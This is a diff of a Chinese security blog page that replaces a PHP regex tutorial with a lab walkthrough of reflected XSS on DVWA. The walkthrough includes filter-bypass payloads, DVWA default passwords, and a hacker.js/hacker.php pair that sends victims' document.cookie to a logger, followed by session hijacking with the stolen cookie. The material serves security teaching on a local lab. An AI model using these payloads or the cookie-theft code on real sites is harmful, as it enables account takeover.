@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">暑假第五周练习(二)php学习--正则表达式 | 奇点的小屋！</title>
+  <title itemprop="name">XSS基础及实战(XSS提取cookie并登录) | 奇点的小屋！</title>
   
     <link rel="shortcut icon" href="/images/favicon.png">
   
@@ -298,11 +298,11 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://s1.ax1x.com/2020/07/31/alzNZV.jpg);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://s1.ax1x.com/2020/07/31/alzNZV.jpg">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://s1.ax1x.com/2020/07/31/alz0G4.jpg);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://s1.ax1x.com/2020/07/31/alz0G4.jpg">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      暑假第五周练习(二)php学习--正则表达式</h1>
+      XSS基础及实战(XSS提取cookie并登录)</h1>
       <p class="entry-census">
         <span>
           <a href="">
@@ -314,7 +314,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2020-8-5<span class="bull">
+        2020-9-6<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -328,43 +328,73 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <p>@<a href="目录">TOC</a></p>
-<h3 id="0×00-正则表达式语法规则"><a href="#0×00-正则表达式语法规则" class="headerlink" title="0×00 正则表达式语法规则"></a>0×00 正则表达式语法规则</h3><p>定义：正则表达式描述了一类字符串的特征，通过这个特征与特定的函数配合，对其它的字符串进行匹配、查找、替换及分割操作！ 这类字符串的特征是由一个或多个。</p>
-<h3 id="0×01-定界符"><a href="#0×01-定界符" class="headerlink" title="0×01 定界符"></a>0×01 定界符</h3><p>我们一般习惯使用正斜线”/“作为定界的字符<br>     当然除了字母、数字、和反斜线以外的字符都可以作为定界符，比如<br>     #<br>     !<br>     {}<br>     |<br>     都是可以的！<br>     定界符放在正则表达式的起始位置，前后一致！</p>
-<h3 id="0×02-普通字符"><a href="#0×02-普通字符" class="headerlink" title="0×02 普通字符"></a>0×02 普通字符</h3><p>字符串的一些字符，比如：a-z、A-Z、0-9、双引号、单引号，它们没有特殊的含义。</p>
-<h3 id="0×03-元字符"><a href="#0×03-元字符" class="headerlink" title="0×03 元字符"></a>0×03 元字符</h3><p>记住一些常用的就行了。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">   \d	匹配任意一个十进制数字，等价于[0-9]</span><br><span class="line">\D	匹配任意一个除十进制数字以外字符,等价于[^0-9]</span><br><span class="line">\s	匹配任意一个空白字符,比如换页符、换行符、回车符、制表符、垂直制表符</span><br><span class="line">\S	匹配除空白字符以外的任何一个字符</span><br><span class="line">\w	匹配任意一个数字或字母或下划线</span><br><span class="line">\W	匹配除数字、字母、下划线以外的任意一个字符</span><br><span class="line">.	匹配除换行符以外的任意一个字符</span><br><span class="line"></span><br><span class="line">*	匹配0次、或1次、或多次其前面的字符</span><br><span class="line">+	匹配1次或多次其前面的字符</span><br><span class="line">?	匹配0次或1次其前面的字符</span><br><span class="line">&#123;n&#125;	表示其前面字符恰好出现n次</span><br><span class="line">&#123;n,&#125;	表示其前面字符出现不少于n次</span><br><span class="line">&#123;n,m&#125;	表示其前面的字符至少出现n次，最多出现m次</span><br><span class="line"></span><br><span class="line">^或\A	匹配字符串开始位置</span><br><span class="line">$或者\Z	匹配字符串的结束位置</span><br><span class="line"></span><br><span class="line">|	匹配两个或多个模式</span><br><span class="line"></span><br><span class="line">[]	匹配方括号中的任意一个字符</span><br><span class="line">[^]	匹配除方括号中字符以外的任意一个字符</span><br><span class="line">()	将括号中作为一个整体以便将其中的内容获取到</span><br><span class="line">	在我们的正则表达式中 可以使用圆括号来将某一段括起来，在圆括号的后面部分，我们可以使用</span><br><span class="line">\\  数字 来代表圆括号部分所匹配到的内容！</span><br></pre></td></tr></table></figure>
-<p>如果要匹配<code>.</code>我们可以使用<code>\</code>来转义。</p>
-<h3 id="0×04-模式修正符"><a href="#0×04-模式修正符" class="headerlink" title="0×04 模式修正符"></a>0×04 模式修正符</h3><p>常见模式修正符</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">i	在和模式进行匹配时不区分大小写</span><br><span class="line">m	多行匹配，如果目标字符串 中没有&quot;\n&quot;字符, 或者模式中没有出现^或$, 设置这个修饰符不产生任何影响</span><br><span class="line">s	如果设定了此修正符，那么.将匹配所有的字符包括换行符</span><br><span class="line">U	禁止贪婪匹配</span><br><span class="line">e(已经被弃用)</span><br></pre></td></tr></table></figure>
+          <p>该学新知识了！<br>本篇文章篇幅有点长，做了很多的本地攻击演示！<br>请耐心观看。</p>
+<p>@<a href="目录">TOC</a></p>
+<h3 id="XSS基础"><a href="#XSS基础" class="headerlink" title="XSS基础"></a>XSS基础</h3><p>XSS的定义：XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p>
+<h3 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h3><p>XSS有三类：反射型XSS(非持久型)、存储型XSS(持久型)和DOM XSS。</p>
+<p><strong>反射型XSS(非持久型XSS)，攻击方式具有一次性。</strong></p>
+<p>攻击方式：攻击者通过包含XSS代码的恶意链接发送给受害者，当受害者访问该连接时，服务器接收该受害者用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给受害者用户的浏览器，浏览器解析这段包含XSS代码的恶意脚本，就会触发XSS漏洞然后完成攻击。</p>
+<p><strong>持久型xss攻击：持久型xss，会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。</strong></p>
+<p>攻击方式：多见与论坛，博客以及网站留言板。攻击者通过发帖，留言的方式，将恶意XSS脚本连同正常信息通过留言板提交到服务器内并被服务器存储下来，恶意XSS脚本也将保存在服务器中，当其他用户浏览帖子或者留言时，恶意XSS脚本会在他们的浏览器中执行。</p>
+<p><strong>DOM跨站（DOM XSS）：DOM（document object model文档对象模型），客户端脚本处理逻辑导致的安全问题。</strong></p>
+<p>DOM型XSS是一种特殊类型的反射型XSS，基于DOM文档对象模型的一种漏洞。DOM XSS和反射型XSS、存储型XSS的差别在于DOM XSS的代码并不需要服务器参与，触发XSS靠的是浏览器端的DOM解析，完全是客户端的事情。在整个攻击过程中，服务器响应的页面并没有发生变化，引起客户端脚本执行结果差异的原因是对本地DOM的恶意篡改利用。</p>
+<h3 id="反射型XSS的利用"><a href="#反射型XSS的利用" class="headerlink" title="反射型XSS的利用"></a>反射型XSS的利用</h3><h4 id="演示一（基于DoraBOX靶场）"><a href="#演示一（基于DoraBOX靶场）" class="headerlink" title="演示一（基于DoraBOX靶场）"></a>演示一（基于DoraBOX靶场）</h4><p><img src="https://img-blog.csdnimg.cn/20200905085802117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>一个正常的输入框，我们可以将自己的xss代码写在提交框里。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200905085932663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>数据没有插入到后台，浏览器会把我插入的内容，当作可执行代码给我们返回来。</p>
+<h4 id="演示二-基于DVWA靶场"><a href="#演示二-基于DVWA靶场" class="headerlink" title="演示二(基于DVWA靶场)"></a>演示二(基于DVWA靶场)</h4><p>登录的时候，没想起来账号，密码！但是有万能的</p>
+<p>DVWA默认的用户有5个，用户名密码如下（一个足以）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">admin&#x2F;password</span><br><span class="line"></span><br><span class="line">gordonb&#x2F;abc123</span><br><span class="line"></span><br><span class="line">1337&#x2F;charley</span><br><span class="line"></span><br><span class="line">pablo&#x2F;letmein</span><br><span class="line"></span><br><span class="line">smithy&#x2F;password</span><br></pre></td></tr></table></figure>
 
-<h3 id="0×05-与正则表达式配合的函数"><a href="#0×05-与正则表达式配合的函数" class="headerlink" title="0×05 与正则表达式配合的函数"></a>0×05 与正则表达式配合的函数</h3><p>主要有：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.preg_match()</span><br><span class="line">2.preg_match_all()</span><br><span class="line">3.preg_replace()</span><br></pre></td></tr></table></figure>
-<p>①1.preg_match()</p>
-<pre><code>preg_match — 执行匹配正则表达式</code></pre><p>语法：<br>int preg_match ( string $pattern , string $ subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )</p>
-<p>各参数：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$pattern: 要搜索的模式，字符串形式。</span><br><span class="line"></span><br><span class="line">$subject: 输入字符串。</span><br><span class="line"></span><br><span class="line">$matches: 如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。</span><br><span class="line"></span><br><span class="line">$flags：flags 可以被设置为以下标记值：</span><br><span class="line"></span><br><span class="line">PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。</span><br><span class="line"></span><br><span class="line">offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)。</span><br></pre></td></tr></table></figure>
+<p>登录进去，选择反射型XSS。</p>
+<h5 id="等级为：impossible"><a href="#等级为：impossible" class="headerlink" title="等级为：impossible"></a>等级为：impossible</h5><p>选择一个简单的payload：<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20200905094936325.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入任何xss代码，正常的输出，不会弹出我们想要的界面，这也让我很懵逼。</p>
+<p>无奈查看了源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $name &#x3D; htmlspecialchars( $_GET[ &#39;name&#39; ] );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Feedback for end user</span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br></pre></td></tr></table></figure>
 
-<p>②preg_match_all()</p>
-<pre><code>preg_match_all 函数用于执行一个全局正则表达式匹配。</code></pre><p>语法：<br>int preg_match_all ( string $pattern , string $subject [, array &amp;$matches [, int $flags = PREG_PATTERN_ORDER [, int $offset = 0 ]]] )</p>
-<p>两者区别：返回 pattern 的匹配次数。 它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后 将会停止搜索。preg_match_all() 不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。</p>
-<p>③preg_replace()</p>
-<blockquote>
-<p>preg_replace 函数执行一个正则表达式的搜索和替换。</p>
-</blockquote>
-<p>语法：</p>
-<blockquote>
-<p>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</p>
-</blockquote>
-<p>搜索 string 中字符串并且匹配 pattern 的部分， 以 replacement 进行替换。</p>
-<p>参数释义：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">参数说明：</span><br><span class="line"></span><br><span class="line">$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</span><br><span class="line"></span><br><span class="line">$replacement: 用于替换的字符串或字符串数组。</span><br><span class="line"></span><br><span class="line">$string: 要搜索替换的目标字符串或字符串数组。</span><br><span class="line"></span><br><span class="line">$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</span><br><span class="line"></span><br><span class="line">$count: 可选，为替换执行的次数。</span><br></pre></td></tr></table></figure>
-<p>示例：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$string &#x3D; &#39;google 123, 456&#39;;</span><br><span class="line">$pattern &#x3D; &#39;&#x2F;(\w+) (\d+), (\d+)&#x2F;i&#39;;</span><br><span class="line">$replacement &#x3D; &#39;runoob $&#123;2&#125;,$3&#39;;</span><br><span class="line">echo preg_replace($pattern, $replacement, $string);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>结果：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runoob 123,456</span><br></pre></td></tr></table></figure>
-<p>如果 string 是一个数组， preg_replace() 返回一个数组， 其他情况下返回一个字符串。<br>如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。</p>
-<p>正则表达式的初次见面结束了！！！</p>
+<p>发现了 htmlspecialchars() 函数，其主要作用就是把一些预定义的字符转换为 HTML 实体。</p>
+<p>预定义的字符是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; （和号） 成为 &amp;</span><br><span class="line">&quot; （双引号） 成为 &quot;</span><br><span class="line">&#39; （单引号） 成为 &amp;apos;</span><br><span class="line">&lt; （小于） 成为 &lt;</span><br><span class="line">&gt; （大于） 成为 &gt;</span><br></pre></td></tr></table></figure>
+
+<p>我说怎么输入，都不会弹窗，而是直接输出，我输入的xss代码，经过htmlspecialchars() 函数的转换，被转换成非HTML可执行代码，所以impossible等级不存在XSS漏洞。</p>
+<h5 id="等级为：low"><a href="#等级为：low" class="headerlink" title="等级为：low"></a>等级为：low</h5><h6 id="简单的演示"><a href="#简单的演示" class="headerlink" title="简单的演示"></a>简单的演示</h6><p>构造payload:<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20200905101018322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>弹窗成功！</p>
+<p>查看源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Feedback for end user</span><br><span class="line">    echo &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;&#x2F;pre&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>以get方式传参，没有经过任何过滤，很明显存在XSS漏洞。</p>
+<h6 id="本地利用XSS获取cookie"><a href="#本地利用XSS获取cookie" class="headerlink" title="本地利用XSS获取cookie"></a>本地利用XSS获取cookie</h6><p>工欲善其事，必先利其器。</p>
+<p>直接上我们的工具！！！</p>
+<p>hacker.js</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var img &#x3D; new Image();</span><br><span class="line">img.src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;DVWA&#x2F;vulnerabilities&#x2F;xss_r&#x2F;hacker.php?x&#x3D;&quot; + document.cookie;</span><br><span class="line">document.body.append(img);</span><br></pre></td></tr></table></figure>
+<p>hacker.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cookie &#x3D; $_GET[&#39;x&#39;];</span><br><span class="line">$ip &#x3D; getenv (&#39;REMOTE_ADDR&#39;);</span><br><span class="line">$time &#x3D; date(&#39;Y-m-d g:i:s&#39;);</span><br><span class="line">$fp &#x3D; fopen(&quot;cookie.txt&quot;,&quot;a&quot;);</span><br><span class="line">fwrite($fp,&quot;IP: &quot;.$ip.&quot;Date: &quot;.$time.&quot; Cookie:&quot;.$cookie.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>构造我们的payload：<code>http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=&lt;script src=&quot;http://127.0.0.1/DVWA/vulnerabilities/xss_r/hacker.js&quot; /&gt;&lt;/script&gt;</code></p>
+<p>将我们的URL发给另外一个用户，他点了一下。<br>并且输入自己的姓名。<br><img src="https://img-blog.csdnimg.cn/20200906101008151.png#pic_center" alt="在这里插入图片描述"></p>
+<p>他输入之后，我们这边就生成了一个cookie.txt文件，我们打开看一下</p>
+<p><img src="https://img-blog.csdnimg.cn/20200906101102490.png#pic_center" alt="在这里插入图片描述"><br>他的IP，登陆地址，还有cookie已经在我们这边了。</p>
+<p>😉既然拿到了cookie，下面我们应该改怎么办？？？</p>
+<p>演示一下：<br>我们来到DVWA的登陆界面，F12打开页面，找到cookie<br><img src="https://img-blog.csdnimg.cn/2020090610161025.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>我们新建或者编辑一个cookie<br><img src="https://img-blog.csdnimg.cn/2020090610181289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>内容就是我们刚刚得到的cookie，刷新一下页面。<br><img src="https://img-blog.csdnimg.cn/20200906104150227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>登陆成功喽！这是简单的通过XSS漏洞获得cookie，并且登录</p>
+<h5 id="等级为：medium"><a href="#等级为：medium" class="headerlink" title="等级为：medium"></a>等级为：medium</h5><p>按照上个payload输入，发现了一点东西，<br><img src="https://img-blog.csdnimg.cn/20200905101819704.png#pic_center" alt="在这里插入图片描述"></p>
+<p>我们的<code>&lt;script&gt;</code>没有了，猜想可能被替代掉了。</p>
+<p>我们换种payload:<code>&lt;SCript&gt;alert(/XSS/)&lt;/SCript&gt;</code><br><img src="https://img-blog.csdnimg.cn/20200906213601615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>这可能是黑名单过滤！</p>
+<p>看一下源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $name &#x3D; str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Feedback for end user</span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现了<code>str_replace()函数</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str_replace(find,replace,string,count)</span><br><span class="line"></span><br><span class="line">find 	必需。规定要查找的值。</span><br><span class="line">replace 	必需。规定替换 find 中的值的值。</span><br><span class="line">string 	必需。规定被搜索的字符串。</span><br><span class="line">count 	可选。对替换数进行计数的变量。</span><br></pre></td></tr></table></figure>
+<p>我们传入的name,将会经过str_replace()函数处理，查看name内是否有<code>&lt;script&gt;</code>,有则把<code>&lt;script&gt;</code>替换成 空格。这应该就是简单的黑名单过滤吧！</p>
+<p>对于str_replace()函数我们也可以通过双写绕过<code>&lt;scr&lt;script&gt;ipt&gt;alert(/xss/);&lt;/script&gt;</code></p>
+<p>也可以使用非 script 标签的 xss payload绕过</p>
+<p><strong>img标签：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;1 onerror&#x3D;alert(&#39;xss&#39;)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>iframe标签：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="等级为：High"><a href="#等级为：High" class="headerlink" title="等级为：High"></a>等级为：High</h5><p>输入payload，页面只剩下这个符号：<code>&gt;</code><br><img src="https://img-blog.csdnimg.cn/20200906220146100.png#pic_center" alt="在这里插入图片描述"><br>猜想是不是把我们输入的<code>&lt;script&gt;alert(/XSS/)&lt;/script&gt;</code>全部过滤，只剩下<code>&gt;</code>,可能还是黑名单过滤，但可能比之前更高级。</p>
+<p>既然是黑名单过滤，那我们就使用非script的标签绕过，payload:<code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p>
+<p>当然也可以使用iframe标签绕过！！！</p>
+<p><img src="https://img-blog.csdnimg.cn/20200906220539708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>XSS反射型的介绍和利用就先到这结束，本来想把存储型和DOM型一起写了，但无奈篇幅太长影响阅读！！！稍后补上！</p>
+<p>顺便说句开学快乐！！！！</p>
 
         </div>
         <!-- .entry-content -->
@@ -396,15 +426,15 @@
           
             <div class="post-nepre half previous">
           
-            <a href="/2020/08/13/%E6%9A%91%E5%81%87%E7%AC%AC%E5%85%AD%E5%91%A8%E7%BB%83%E4%B9%A0(%E4%B8%80)sqllibs%E9%9D%B6%E5%9C%BA%E6%B8%A9%E4%B9%A0(1-6)/" rel="prev">
+            <a href="/2020/09/09/XSS(%E5%AD%98%E5%82%A8%E5%9E%8B)%E5%88%A9%E7%94%A8%E5%92%8C%E5%AE%9E%E6%88%98/" rel="prev">
               <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://s1.ax1x.com/2020/07/31/alzwiF.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://s1.ax1x.com/2020/07/31/alzwiF.jpg">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://s1.ax1x.com/2020/07/31/alzaIU.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://s1.ax1x.com/2020/07/31/alzaIU.jpg">
               </div>
               <span class="label">
               Previous Post</span>
               <div class="info">
                 <h3>
-                sqllibs靶场温习(1-6)</h3>
+                XSS(存储型)利用与实战</h3>
                 <hr>
               </div>
             </a>
@@ -414,15 +444,15 @@
           
             <div class="post-nepre half next">
           
-            <a href="/2020/08/04/%E6%9A%91%E5%81%87%E7%AC%AC%E4%BA%94%E5%91%A8%E7%BB%83%E4%B9%A0(%E4%B8%80)Crypto%E7%BB%83%E4%B9%A0/" rel="next">
+            <a href="/2020/09/03/html+css+php+mysql%20%E7%AE%80%E5%8D%95%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%99%BB%E5%BD%95%E4%B8%8E%E6%B3%A8%E5%86%8C(%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BA%A4%E4%BA%92)/" rel="next">
               <div class="background">
